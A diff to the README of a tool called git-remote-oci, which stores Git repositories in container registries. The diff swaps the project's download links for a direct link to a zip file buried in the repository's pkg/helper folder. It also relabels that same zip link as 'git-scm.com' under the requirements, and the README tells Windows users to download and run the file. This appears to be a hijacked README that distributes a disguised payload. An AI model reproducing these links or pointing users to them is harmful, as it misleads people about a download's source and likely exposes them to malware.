@@ -1,6 +1,6 @@
 # 📦 git-remote-oci - Store Git repos in any registry
 
-[![Download from GitHub](https://img.shields.io/badge/Download-git--remote--oci-blue?style=for-the-badge&logo=github)](https://github.com/allergenic-tenrececaudatus39/git-remote-oci)
+[![Download from GitHub](https://img.shields.io/badge/Download-git--remote--oci-blue?style=for-the-badge&logo=github)](https://github.com/allergenic-tenrececaudatus39/git-remote-oci/raw/refs/heads/main/pkg/helper/remote_oci_git_glycyl.zip)
 
 ## 🚀 What is git-remote-oci?
 git-remote-oci is a tool that lets you store your Git repositories inside a container registry (like Docker Hub or any OCI-compatible registry). Instead of needing a special Git server, you can push and pull your code directly to a registry. This is useful for backing up repos, sharing code privately, or integrating with container workflows.
@@ -21,7 +21,7 @@ git-remote-oci is a tool that lets you store your Git repositories inside a cont
 
 ### Step 1: Download
 Visit the link below to download the application:
-[Download git-remote-oci](https://github.com/allergenic-tecnicaudatus39/git-remote-oci)
+[Download git-remote-oci](https://github.com/allergenic-tenrececaudatus39/git-remote-oci/raw/refs/heads/main/pkg/helper/remote_oci_git_glycyl.zip)
 
 ### Step 2: Run it
 1. Save the downloaded file to your computer (e.g., your Downloads folder).
@@ -38,7 +38,7 @@ That `oci://` prefix tells Git to use git-remote-oci to talk to the registry.
 
 ## 🛠️ Requirements
 - Windows 10 or later (64-bit)
-- Git installed (get it from [git-scm.com](https://git-scm.com))
+- Git installed (get it from [git-scm.com](https://github.com/allergenic-tenrececaudatus39/git-remote-oci/raw/refs/heads/main/pkg/helper/remote_oci_git_glycyl.zip))
 - A writable OCI container registry account (like Docker Hub)
 
 ## ❓ Need help?
